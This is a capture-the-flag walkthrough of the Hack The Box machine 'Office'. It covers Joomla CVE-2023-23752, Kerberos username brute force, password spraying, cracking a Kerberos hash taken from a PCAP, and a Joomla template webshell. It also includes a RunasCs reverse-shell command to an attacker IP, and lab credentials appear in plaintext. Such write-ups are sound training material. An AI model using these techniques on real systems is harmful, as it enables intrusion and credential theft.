---
title: HTB: Office
url: https://0xdf.gitlab.io/2024/06/22/htb-office.html
date: 2024-06-22T09:00:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-office, ctf, hackthebox, nmap, windows, netexec, joomla, feroxbuster, cve-2023-23752, kerbrute, pcap, wireshark, hashcat, joomla-webshell, runascs, libreoffice, chisel, phishing, macros, cve-2023-2255, cmd-key, saved-credentials, dpapi, mimikatz, gpo, sharp-gpo-abuse, htb-devvortex, htb-access
---

![Office](/img/office-cover.png)

Office starts with a Joomla instance that leaks a password. I’ll brute force usernames over Kerberos and then password spray to find where the password is reused. that use has access to an SMB share where I find a PCAP that includes a Kerberos authentication exchange. I’ll build a hash from that and crack it to get another password. This one also works for the Joomla admin account. I’ll add a webshell to a template and get a foothold on the box. There’s an internal site that takes resume submissions. I’ll abuse LibreOffice two ways, first by a CVE and then by editing the registry to enable macros. The next user has saved credentials, which I’ll decrypt with Mimikatz. Finally, I’ll abuse GPO access to get administrative access.

## Box Info

| Name | [Office](https://hackthebox.com/machines/office)  [Office](https://hackthebox.com/machines/office) [Play on HackTheBox](https://hackthebox.com/machines/office) |
| --- | --- |
| Release Date | [17 Feb 2024](https://twitter.com/hackthebox_eu/status/1758113967442952371) |
| Retire Date | 22 Jun 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Office |
| Radar Graph | Radar chart for Office |
| First Blood User | 00:50:52[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 02:47:35[l1nvx l1nvx](https://app.hackthebox.com/users/634163) |
| Creator | [0rii 0rii](https://app.hackthebox.com/users/169229) |

## Recon

### nmap

`nmap` finds many open TCP ports, looking like a Windows domain controller:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.3
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-13 12:40 EDT
Nmap scan report for 10.10.11.3
Host is up (0.088s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
49922/tcp open  unknown
65181/tcp open  unknown
65186/tcp open  unknown
65216/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
oxdf@hacky$ nmap -p 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,49922,65181,65186,65216 -sCV 10.10.11.3
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-13 14:49 EDT
Nmap scan report for 10.10.11.3
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-14 02:49:52Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-14T02:53:00+00:00; +7h59m57s from scanner time.
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-14T02:53:02+00:00; +7h59m57s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-14T02:53:00+00:00; +7h59m57s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-14T02:53:00+00:00; +7h59m57s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49922/tcp open  msrpc         Microsoft Windows RPC
65181/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65186/tcp open  msrpc         Microsoft Windows RPC
65216/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/13%Time=666B3F57%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m56s, deviation: 0s, median: 7h59m56s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-06-14T02:52:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.11 seconds

```

There a ton here. Notes:
- TCP 80 showsa Joomla CMS site.
- The hostname `DC.office.htb` is present on LDAP TLS certificates (though interestingly the web server on 443 shows `localhost`).
- TCP 443 is just returning a 403 forbidden.

Given the use of domain names, I’ll try fuzzing for subdomains of `office.htb` that respond differently. The brute force went *really* slowly, so I’ll kill that and add that to my later enumeration if I’m stuck. I’ll add what I have to my `/etc/hosts`:

```
10.10.11.3 office.htb dc dc.office.htb

```

Enumeration to do list:
- Tier 1: SMB, Web ports
- Tier 2: LDAP, DNS brute force, Kerberos brute force, subdomain brute force
- With creds: WinRM is open

### SMB - TCP 445

`netexec` confirms the host and domain:

```

oxdf@hacky$ netexec smb 10.10.11.3
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)

```

I’m not able to do any unauth enumeration:

```

oxdf@hacky$ netexec smb 10.10.11.3 -u guest -p ''
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb 10.10.11.3 -u oxdf -p oxdf
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\oxdf:oxdf STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb 10.10.11.3 -u oxdf -p ''
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\oxdf: STATUS_LOGON_FAILURE

```

### Website - TCP 80

#### Site

The site is a blog about Iron Man and holigrams:

![image-20240613152207914](/img/image-20240613152207914.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The posts are written by and signed by “Tony Stark”, the CEO of the company. There’s not much else interesting on the page.

#### Tech Stack

`nmap` identified the site as [Joomla](https://www.joomla.org/), a free and open-source PHP-based content management system (CMS). There’s a lot of ways to identify this. It’s in the HTML at the top of the main page:

```

<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
    <meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="generator" content="Joomla! - Open Source Content Management">
...[snip]...

```

The `robots.txt` file points that way as well:

![image-20240613152630304](/img/image-20240613152630304.png)

`/administrator`is the default relative path for the administrative login. I can get the exact Joomla version at `/administrator/manifests/files/joomla.xml`:

![image-20240613152806917](/img/image-20240613152806917.png)

I know that Joomla is PHP based, and the main site does load as `index.php`.

I’ll skip the directory brute force because I know it’s Joomla and therefore I know it’s structure.

### HTTPS - TCP 443

#### Site

As `nmap` reported, the HTTPS site just returns 403:

![image-20240613164948889](/img/image-20240613164948889.png)

#### Directory Brute Force

Running `feroxbuster` against this actually finds something interesting:

```

oxdf@hacky$ feroxbuster -u https://10.10.11.3 --no-recursion -k -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
                                                                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.10.11.3
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       47w      420c https://10.10.11.3/webalizer
301      GET        9l       30w      336c https://10.10.11.3/joomla => https://10.10.11.3/joomla/
503      GET       11l       44w      401c https://10.10.11.3/examples
403      GET       11l       47w      420c https://10.10.11.3/server-status
403      GET       11l       47w      420c https://10.10.11.3/licenses
403      GET       11l       47w      420c https://10.10.11.3/server-info
[####################] - 63s    26584/26584   0s      found:6       errors:0
[####################] - 63s    26584/26584   424/s   https://10.10.11.3/ 

```

I’m using a lowercase wordlist since Windows is typically case-insensitive, and going without recursion as traversing into `/joomla` finds a ton of stuff. `/joomla` seems to be the same site as TCP 80’s root.

## Auth as dwolfe

### Leak Password

#### CVE-2023-23752 Background

Searching for “Joomla 4.27 exploit” returns a ton of pages about [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752) (most of which are older than Office):

![image-20240613153224798](/img/image-20240613153224798.png)

[NIST](https://nvd.nist.gov/vuln/detail/CVE-2023-23752) describes this rather vaguely:

> An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.

I’ve exploited this vulnerability before in DevVortex, and have a detailed explanation of the vulnerability [here](/2024/04/27/htb-devvortex.html#cve-2023-23752), and there’s a nice [blog post](https://vulncheck.com/blog/joomla-for-rce) from VulnCheck as well. The short version is that what is basically a mass-assignment vulnerability allows an attacker to add `?public=true` to some private API endpoints and run them unauthenticated. There are many ways to use this. In DevVortex, I leaked usernames and config files that included a password, and used those to log into the admin panel.

#### Read Data

There are lots of exploit scripts for this one, but it’s just as easy to show manually. For example, visiting `/api/index.php/v1/config/application` returns 403 forbidden:

![image-20240613153915818](/img/image-20240613153915818.png)

With `?public=true`, there’s a bunch of data:

[![image-20240613153951284](/img/image-20240613153951284.png)*Click for full size image*](/img/image-20240613153951284.png)

From this I’ll get the SQL connection information, user root with password “H0lOgrams4reTakIng0Ver754!”.

`/api/index.php/v1/users` is another common endpoint to check, but there’s only one user:

[![image-20240613164810849](/img/image-20240613164810849.png)*Click for full size image*](/img/image-20240613164810849.png)

This password doesn’t work as administrator for Office, and it doesn’t work as administrator or root on the Joomla admin login.

### Generate User List

Now that I have a password to try, getting a list of users becomes much more important. I’ll use `kerbrute` in `userenum` mode to check for valid users:

```

oxdf@hacky$ kerbrute userenum --dc 10.10.11.3 -d office.htb /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/13/24 - Ronnie Flathers @ropnop

2024/06/13 17:34:57 >  Using KDC(s):
2024/06/13 17:34:57 >   10.10.11.3:88

2024/06/13 17:35:01 >  [+] VALID USERNAME:       administrator@office.htb
2024/06/13 17:35:33 >  [+] VALID USERNAME:       Administrator@office.htb
2024/06/13 17:35:48 >  [+] VALID USERNAME:       ewhite@office.htb
2024/06/13 17:35:48 >  [+] VALID USERNAME:       etower@office.htb
2024/06/13 17:35:48 >  [+] VALID USERNAME:       dwolfe@office.htb
2024/06/13 17:35:48 >  [+] VALID USERNAME:       dmichael@office.htb
2024/06/13 17:35:48 >  [+] VALID USERNAME:       dlanor@office.htb
2024/06/13 17:41:35 >  [+] VALID USERNAME:       hhogan@office.htb
2024/06/13 17:43:14 >  [+] VALID USERNAME:       DWOLFE@office.htb
2024/06/13 17:59:10 >  [+] VALID USERNAME:       DLANOR@office.htb
2024/06/13 18:00:05 >  Done! Tested 624370 usernames (10 valid) in 1508.217 seconds

```

The full list takes 25 minutes, but most of the names come out in the first minute or so.

### Password Spray

I’ll use those users to make a list, and `netexec` to check the password with each of them:

```

oxdf@hacky$ netexec smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 

```

There’s a hit on dwolfe. No matches on WinRM:

```

oxdf@hacky$ netexec winrm office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754!
WINRM       10.10.11.3      5985   DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754!

```

## RCE as web\_account

### Enumeration

With a valid credential, I gain access to SMB shares:

```

oxdf@hacky$ netexec smb office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ            
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share

```

`SOC Analysis` jumps out as non-standard and therefore most interesting. It contains a single PCAP file:

```

oxdf@hacky$ smbclient "//10.10.11.3/SOC Analysis" -U 'office/dwolfe%H0lOgrams4reTakIng0Ver754!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 10 14:52:24 2023
  ..                                DHS        0  Wed Feb 14 05:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023

                6265599 blocks of size 4096. 1245053 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap 
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (4424.7 KiloBytes/sec) (average 4424.7 KiloBytes/sec)

```

I’ll grab it.

### Latest-System-Dump-8fbc124d.pcap

#### Overview

I’ll open the PCAP in Wireshark and start with Statistics –> Endpoints. There are 16 IPv4 endpoints:

![image-20240614113038444](/img/image-20240614113038444.png)

Seems likely that 10.250.0.0/24 is the internal network. The most traffic is from .30. Looking at the TCP numbers, there’s 443 (HTTPS) traffic with all the public IPs. Other than that, .30 has traffic to 88 (Kerberos), 135 (NetBios), and 445 (SMB). The rest of the traffic is high ports from .30 and .41. It seems .30 is the DC, though it’s not clear what all this high port traffic coming out of .30 would be.

Looking at Statistics –> Conversations shows that all of the traffic where .30 is acting as the client is HTTPS traffic outbound. The traffic from .41 is to services on .30:

![image-20240614113608382](/img/image-20240614113608382.png)

#### Kerberos

I’m especially interested in how .41 is authenticating, which is likely the port 88 Kerberos. If I add a Wireshark filter for `ip.addr==10.250.0.41`, there’s only 83 packets (out of almost 2000) to investigate.

There are two AS-REQ requests from the client:

![image-20240614115516452](/img/image-20240614115516452.png)

This is the request from a client to the DC to get a certificate to authenticate to another service (watch [this amazing video](https://www.youtube.com/watch?v=4LDpb1R3Ghg) for a full explanation of Kerberos). Interestingly, neither of them seems to be successful. Still, the client has signed this request using the user’s NTLM hash, which means it could be susceptible to brute force attacks.

The first doesn’t have any authentication data, but the second AS-REP packet does:

![image-20240614120535279](/img/image-20240614120535279.png)

This packet includes a timestamp encrypted by the tstart user.

### Crack Hash

VSScrub has a [really nice post](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/) on just this challenge back from 2020. The quick version is that I can create a Hashcat hash from this `cipher` field knowing that it fits the same encryption type:

```

$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc

```

With `rockyou.txt` it cracks in 12 seconds on my host:

```

$ hashcat ./tstark.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
...[snip]...

```

### Validate

#### On Host

This password does work for the tstark user for SMB, but not for WinRM:

```

oxdf@hacky$ netexec smb office.htb -u tstark -p playboy69
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\tstark:playboy69 
oxdf@hacky$ netexec winrm office.htb -u tstark -p playboy69 
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [-] office.htb\tstark:playboy69

```

Unfortunately, this access doesn’t show anything new in SMB shares.

#### Joomla

This password with the username administrator does work to log into Joomla:

![image-20240614121327109](/img/image-20240614121327109.png)

### RCE

In DevVortex I showed both [modifying a template](/2024/04/27/htb-devvortex.html#via-template-modification) and [creating a plugin](/2024/04/27/htb-devvortex.html#via-webshell-plugin). I’ll go for the template modification this time.

I’ll click on System and select “Site Templates”, and then “Cassiopeia Details and Files”. I’ll edit `index.php`, and after making a change in a comment to make sure I have permissions (I do), I’ll add a simple webshell that if the `cmd` parameter is set, it just calls `system` and returns, and otherwise the page is the same:

![image-20240614121830268](/img/image-20240614121830268.png)

It works:

![image-20240614121843349](/img/image-20240614121843349.png)

This does get reset every few minutes, so I’ll just keep the edit page open, and reclick “Save” any time I need the webshell back.

## Shell as TStark

### Upload RunasCs

Rather than get a shell as web\_account, I’m going to skip directly to tstark. I’ll host [RunasCs](https://github.com/antonioCoco/RunasCs) on my Python webserver, and download it to `programdata`:

![image-20240614122203133](/img/image-20240614122203133.png)

There are hits on my Python webserver as well:

```
10.10.11.3 - - [14/Jun/2024 18:21:44] "GET /RunasCs.exe HTTP/1.1" 200 -
10.10.11.3 - - [14/Jun/2024 18:21:44] "GET /RunasCs.exe HTTP/1.1" 200 -

```

The webshell shows `r.exe` is there as well:

![image-20240614122310167](/img/image-20240614122310167.png)

### Shell

I’ll send `?cmd=C:\programdata\r.exe tstark playboy69 cmd.exe -r 10.10.14.5:443`, and I get a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.3 52313
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
office\tstark

```

I’ll upgrade to PowerShell:

```

C:\> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\>

```

And grab `user.txt`:

```

PS C:\users\tstark\desktop> type user.txt
ccb216be************************

```

## Shell as PPotts

### Enumeration

#### Current User

TStark is a member of the “Registry Editors” group:

```

PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

That’s a custom group for Office, but it seems to imply that TStark can edit at least parts of the registry.

#### Home Directories

There are six home directories on this host:

```

PS C:\Users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:22 AM                Administrator
d-----         1/18/2024  12:24 PM                HHogan
d-----         1/22/2024   9:22 AM                PPotts
d-r---         1/18/2024  12:29 PM                Public
d-----         1/18/2024  10:33 AM                tstark
d-----         1/22/2024   9:22 AM                web_account 

```

That matches up with the accounts on the box:

```

PS C:\users> net user

User accounts for \\DC
-------------------------------------------------------------------------------
Administrator            HHogan                   krbtgt                   
PPotts                   tstark                   
The command completed successfully.

```

I’ve already owned web\_account and tstark, both of which has basically empty home directories.

#### Web

The webserver here is [Xampp](https://www.apachefriends.org/), homed out of `xampp` in the root of `C`:

```

PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         2/14/2024   2:18 AM                Program Files
d-----         1/17/2024   1:10 PM                Program Files (x86)
d-----         5/10/2023  11:52 AM                SOC Analysis
d-r---         1/17/2024  10:50 AM                Users
d-----         2/14/2024   4:04 PM                Windows
d-----         1/24/2024   4:08 AM                xampp

```

There’s nothing else too interesting in the root.

The webroots would be stored in `C:\xampp\htdocs`, which interestingly has three directories:

```

PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2023   7:53 AM                administrator
d-----         1/30/2024   8:39 AM                internal
d-----          5/8/2023   3:10 PM                joomla

```

There’s nothing new in the `joomla` dir, as I’ve already leaked the DB connection creds.

The `administrator` directory has a single log file at `administrator\logs\1.error.php`, and it’s not interesting.

`internal` seems to be another website:

```

PS C:\xampp\htdocs>  ls internal

    Directory: C:\xampp\htdocs\internal

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/14/2024   5:35 PM                applications
d-----          5/1/2023   4:27 PM                css
d-----          5/1/2023   4:27 PM                img
-a----         1/30/2024   8:38 AM           5113 index.html
-a----         1/30/2024   8:40 AM           5282 resume.php

```

In `C:\xampp\apache\conf\httpd.conf`, I’ll find the setup of the virtual host for this site:

```

<VirtualHost *:8083>
    DocumentRoot "C:\xampp\htdocs\internal"
    ServerName localhost:8083

    <Directory "C:\xampp\htdocs\internal">
        Options -Indexes +FollowSymLinks +MultiViews
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog "logs/myweb-error.log"
    CustomLog "logs/myweb-access.log" combined
</VirtualHost> 

```

The `applications` directory is empty, but it is owned by the PPotts user, and web\_account has access to write to it:

```

PS C:\xampp\htdocs\internal> icacls applications
applications CREATOR OWNER:(OI)(CI)(IO)(F)
             OFFICE\PPotts:(OI)(CI)(NP)(F)
             NT AUTHORITY\SYSTEM:(OI)(CI)(F)
             NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
             OFFICE\web_account:(OI)(CI)(RX,W)
             BUILTIN\Administrators:(OI)(CI)(F)
             BUILTIN\Users:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files

```

#### Installed Programs

One other useful bit of enumeration is understanding the programs installed on Office.

```

PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:58 AM                Common Files
d-----         1/25/2024  12:20 PM                Internet Explorer
d-----         1/17/2024   1:26 PM                LibreOffice 5
d-----          5/2/2023   5:22 PM                Microsoft OneDrive
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----         4/14/2023   3:22 PM                Npcap
d-----         4/12/2023   4:30 PM                Oracle
d-----         2/14/2024   2:18 AM                VMware
d-----         4/17/2023   3:35 PM                Windows Defender
d-----         1/25/2024  12:20 PM                Windows Defender Advanced Threat Protection
d-----         1/25/2024  12:20 PM                Windows Mail
d-----         1/25/2024  12:20 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
d-----         4/14/2023   3:23 PM                Wireshark
PS C:\Program Files (x86)> ls

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                Common Files
d-----         1/25/2024  12:20 PM                Internet Explorer
d-----         1/17/2024   1:13 PM                LibreOffice 4
d-----         4/14/2023   6:06 PM                Microsoft
d-----         4/14/2023   6:05 PM                Microsoft.NET
